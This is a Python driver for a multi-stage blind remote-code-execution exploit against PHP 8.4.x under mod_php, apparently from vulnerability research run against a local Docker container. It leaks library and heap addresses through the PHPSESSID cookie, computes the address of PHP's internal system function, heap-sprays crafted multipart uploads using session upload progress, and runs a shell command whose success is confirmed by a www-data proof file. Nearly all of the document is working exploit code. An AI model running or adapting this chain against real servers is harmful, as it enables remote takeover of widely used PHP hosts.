#!/usr/bin/env python3
"""Blind A1 -> B1 -> A2 -> B2 chain, parameterised per PHP 8.4.x build.

Only HTTP + the target-written proof file are used.  No pinning, no /proc,
no gdb.  Derived from the 2026-10-23 mod_php 8.4.24/8.4.26 driver.
"""
import argparse, json, os, socket, struct, subprocess, sys, time, urllib.parse
from collections import Counter

REPO = "/tmp/opencode/research/9bie_update_20261022T115026Z/code/repo"
PURE = os.path.join(REPO, "pure")
sys.path.insert(0, PURE)
sys.path.insert(0, REPO)

BOUND = b"C" * 10


def send_chunked(port, path, body_file, save, timeout=300):
    cmd = [sys.executable, os.path.join(PURE, "chunked_send.py"),
           "--port", str(port), "--body-file", body_file, "--path", path,
           "--timeout", str(timeout), "--save-response", save]
    return subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)


def send_plain(port, path, body, timeout=300):
    req = ("POST %s HTTP/1.1\r\nHost: 127.0.0.1:%d\r\n"
           "Content-Type: multipart/form-data; boundary=%s\r\n"
           "Content-Length: %d\r\nConnection: close\r\n\r\n" %
           (path, port, BOUND.decode(), len(body))).encode()
    out = bytearray()
    s = socket.create_connection(("127.0.0.1", port), timeout=timeout)
    s.settimeout(timeout)
    try:
        s.sendall(req + body)
        while len(out) < (8 << 20):
            chunk = s.recv(65536)
            if not chunk:
                break
            out.extend(chunk)
    except OSError:
        pass
    finally:
        s.close()
    return bytes(out)


def parse_leak(resp, zdtor_off, main_bucket_count=87):
    i = resp.find(b"Set-Cookie: PHPSESSID=")
    if i < 0:
        raise RuntimeError("no Set-Cookie")
    val = resp[i + len("Set-Cookie: PHPSESSID="):].split(b"\r\n")[0]
    dec = urllib.parse.unquote_to_bytes(val.decode("latin1"))
    counts = Counter()
    for off in range(0, len(dec) - 8, 8):
        q = struct.unpack_from("<Q", dec, off)[0]
        if 0x7f0000000000 <= q <= 0x7fffffffffff:
            counts[q] += 1
    if not counts:
        raise RuntimeError("no pointers")
    zdtor, n = counts.most_common(1)[0]
    lib = zdtor - zdtor_off
    buckets = Counter()
    for q, c in counts.items():
        buckets[q & ~0x1FFFFF] += c
    lib_bucket = zdtor & ~0x1FFFFF
    id_bucket = buckets.most_common(1)[0][0]
    cands = [(b, c) for b, c in buckets.most_common() if b not in (lib_bucket, id_bucket)]
    cands.sort(key=lambda bc: (abs(bc[1] - main_bucket_count), bc[1]))
    return {"decoded": len(dec), "zdtor": zdtor, "lib": lib,
            "main_candidates": [b for b, c in cands[:3]],
            "cand_counts": {hex(b): c for b, c in cands[:3]},
            "top_zdtor_hits": n}


def a2_body(parts=880, depth=64, fillers=115):
    from cheap_oom_a import build_body
    return build_body(parts, depth, fillers, b"a" * 32, b"k0", b"C" * 10)


def b2_body(S, zif, cmd):
    from fake_ref_b import make_spray, make_name
    from mk_ht import build as build_ht
    vl = 384
    n1, n2 = 500, 495
    ht = build_ht(S, zif, cmd.encode(), 384)
    spray = make_spray(vl, S, 1, 0x0107, 8, 32)

    def part(name, value):
        return (b"--" + BOUND + b"\r\nContent-Disposition: form-data; name=\"" +
                name + b"\"\r\n\r\n" + value + b"\r\n")
    body = bytearray()
    for i in range(n1):
        body += part(make_name(b"s", i, 10), spray)
    body += part(b"ht", ht)
    body += part(b"PHPSESSID", b"a" * 32)
    body += part(b"PHP_SESSION_UPLOAD_PROGRESS", b"k0")
    for i in range(n2):
        body += part(make_name(b"t", i, 10), spray)
    body += b"--" + BOUND + b"--\r\n"
    return bytes(body)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--port", type=int, required=True)
    ap.add_argument("--container", required=True)
    ap.add_argument("--a1", required=True)
    ap.add_argument("--b1", required=True)
    ap.add_argument("--n", type=int, default=5)
    ap.add_argument("--zif-off", type=lambda x: int(x, 0), required=True)
    ap.add_argument("--zdtor-off", type=lambda x: int(x, 0), required=True)
    ap.add_argument("--s-off", type=lambda x: int(x, 0), default=0xF8398)
    ap.add_argument("--main-index", type=int, default=0)
    ap.add_argument("--marker", required=True)
    ap.add_argument("--outdir", required=True)
    ap.add_argument("--restart", action="store_true")
    ap.add_argument("--route", choices=["broadcast", "single"], default="single")
    ap.add_argument("--path", default="/index.php")
    ap.add_argument("--a1-query", default="?q0000000=v&q0000001=v&q0000002=v&q0000003=v&q0000004=v")
    ap.add_argument("--timeout", type=float, default=300.0)
    ap.add_argument("--fillers", type=int, default=115)
    args = ap.parse_args()
    os.makedirs(args.outdir, exist_ok=True)
    rec = {"stages": [], "success": False, "marker": args.marker,
           "zif_off": hex(args.zif_off), "zdtor_off": hex(args.zdtor_off),
           "s_off": hex(args.s_off)}
    if args.restart:
        subprocess.run(["docker", "restart", args.container], capture_output=True)
        time.sleep(1.5)
    try:
        s = socket.create_connection(("127.0.0.1", args.port), timeout=5)
        s.sendall(b"GET /index.php HTTP/1.0\r\nHost: x\r\n\r\n")
        s.recv(4096); s.close()
    except OSError:
        pass
    a1 = os.path.abspath(args.a1)
    b1 = os.path.abspath(args.b1)
    for k, p in (("a1", a1), ("b1", b1)):
        rec[k] = {"bytes": os.path.getsize(p),
                  "sha256": subprocess.run(["sha256sum", p], capture_output=True, text=True).stdout.split()[0]}
    # A1
    t0 = time.time()
    pr = send_chunked(args.port, args.path + args.a1_query, a1, os.path.join(args.outdir, "a1.resp"))
    pr.wait(timeout=args.timeout)
    a1_resp = open(os.path.join(args.outdir, "a1.resp"), "rb").read()
    rec["stages"].append({"stage": "A1", "rc": pr.returncode,
                          "status": a1_resp.split(b"\r\n", 1)[0].decode("latin1", "replace"),
                          "bytes": len(a1_resp), "elapsed": round(time.time() - t0, 2)})
    print("A1", rec["stages"][-1], flush=True)
    # B1 concurrent
    procs = []
    for i in range(args.n):
        save = os.path.join(args.outdir, "b1_%d.resp" % i)
        procs.append((i, save, send_chunked(args.port, args.path, b1, save)))
    for i, save, pr in procs:
        try:
            pr.wait(timeout=args.timeout)
        except subprocess.TimeoutExpired:
            pr.kill()
    hit = None
    for i in range(args.n):
        save = os.path.join(args.outdir, "b1_%d.resp" % i)
        data = open(save, "rb").read() if os.path.exists(save) else b""
        row = {"stage": "B1", "i": i, "bytes": len(data),
               "status": data.split(b"\r\n", 1)[0].decode("latin1", "replace")}
        if b"Set-Cookie: PHPSESSID=" in data:
            try:
                info = parse_leak(data, args.zdtor_off)
                row["decoded"] = info["decoded"]
                row["lib"] = hex(info["lib"])
                row["cands"] = info["cand_counts"]
                if info["main_candidates"]:
                    row["main"] = hex(info["main_candidates"][0])
                    row["leak"] = "hit"
                    if hit is None:
                        hit = info
                        row["chosen"] = True
                else:
                    row["leak"] = "no_main"
            except Exception as e:
                row["leak"] = "err:%s" % e
        else:
            row["leak"] = "miss"
        rec["stages"].append(row)
        print("B1", row, flush=True)
    if hit is None:
        rec["failed"] = "B1"
        json.dump(rec, open(os.path.join(args.outdir, "result.json"), "w"), indent=1)
        return 3
    main_addr = hit["main_candidates"][args.main_index]
    lib = hit["lib"]
    S = main_addr + args.s_off
    zif = lib + args.zif_off
    rec.update({"S": hex(S), "zif_system": hex(zif), "main": hex(main_addr),
                "lib": hex(lib), "lib_minus_main": hex(lib - main_addr)})
    a2 = a2_body(fillers=args.fillers)
    rec["a2"] = {"bytes": len(a2), "sha256": __import__("hashlib").sha256(a2).hexdigest()}
    n_a2 = 1 if args.route == "single" else args.n
    for i in range(n_a2):
        try:
            resp = send_plain(args.port, args.path, a2, args.timeout)
        except OSError:
            resp = b""
        rec["stages"].append({"stage": "A2", "i": i, "bytes": len(resp),
                              "status": resp.split(b"\r\n", 1)[0].decode("latin1", "replace")})
        open(os.path.join(args.outdir, "a2_%d.resp" % i), "wb").write(resp)
        time.sleep(0.15)
    time.sleep(0.5)
    proof = "/out/p1_conc_%s" % args.marker
    subprocess.run(["docker", "exec", args.container, "rm", "-f", proof], capture_output=True)
    cmd = "id>%s;echo %s>>%s;id>&2;echo %s>&2" % (proof, args.marker, proof, args.marker)
    b2 = b2_body(S, zif, cmd)
    rec["b2"] = {"bytes": len(b2), "cmd": cmd,
                 "sha256": __import__("hashlib").sha256(b2).hexdigest()}
    n_b2 = args.n + 3 if args.route == "single" else args.n
    for i in range(n_b2):
        try:
            resp = send_plain(args.port, args.path, b2, args.timeout)
        except OSError:
            resp = b""
        rec["stages"].append({"stage": "B2", "i": i, "bytes": len(resp),
                              "status": resp.split(b"\r\n", 1)[0].decode("latin1", "replace")})
        open(os.path.join(args.outdir, "b2_%d.resp" % i), "wb").write(resp)
        time.sleep(0.5)
        pr = subprocess.run(["docker", "exec", args.container, "cat", proof],
                            capture_output=True, text=True)
        if pr.returncode == 0 and "uid=33(www-data" in pr.stdout and args.marker in pr.stdout:
            rec["proof"] = pr.stdout
            rec["success"] = True
            rec["b2_hit"] = i
            break
    time.sleep(0.8)
    pr = subprocess.run(["docker", "exec", args.container, "cat", proof],
                        capture_output=True, text=True)
    rec["proof"] = pr.stdout
    if pr.returncode == 0 and "uid=33(www-data" in pr.stdout and args.marker in pr.stdout:
        rec["success"] = True
    json.dump(rec, open(os.path.join(args.outdir, "result.json"), "w"), indent=1)
    print("RESULT", rec["success"], rec.get("proof", "").replace("\n", " | ")[:160], flush=True)
    return 0 if rec["success"] else 5


if __name__ == "__main__":
    raise SystemExit(main())
